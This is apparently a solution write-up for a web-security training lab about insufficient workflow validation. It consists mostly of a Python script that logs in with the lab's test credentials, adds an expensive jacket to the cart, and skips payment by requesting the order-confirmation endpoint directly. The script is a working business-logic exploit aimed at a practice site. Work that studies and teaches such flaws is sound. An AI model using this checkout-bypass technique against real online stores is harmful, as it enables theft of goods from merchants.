# Insufficient workflow validation

> This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup

BASE_URL = "https://0aea00a7047f9db28062ee25004500fb.web-security-academy.net/"

def exploit_workflow_bypass(url):
    session = requests.Session()
    
    # 1. Login Phase
    login_endpoint = url + "login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_credentials)
    
    if "Log out" in response.text:
        print("[+] Login successful.")
        
        # 2. Add to Cart Phase
        cart_endpoint = url + "cart"
        cart_payload = {
            "productId": 1,
            "redir": "PRODUCT",
            "quantity": 1
        }
        
        response = session.post(cart_endpoint, data=cart_payload)
        
        if response.status_code in [200, 302]:
            print("[+] Target item added to cart.")
            
            # 3. Workflow Bypass Phase (Skipping Checkout)
            confirm_endpoint = url + "cart/order-confirmation"
            confirmation_params = {"order-confirmed": "true"}
            
            response = session.get(confirm_endpoint, params=confirmation_params)
            
            if response.status_code == 200:
                print("[+] Workflow bypassed. Order confirmation triggered.")
                
                # 4. Verification Phase
                final_check = session.get(url)
                if "Congratulations" in final_check.text:
                    print("[+] Lab solved: Item successfully purchased.")
                else:
                    print("[-] Lab not solved.")

if __name__ == "__main__":
    exploit_workflow_bypass(BASE_URL)
```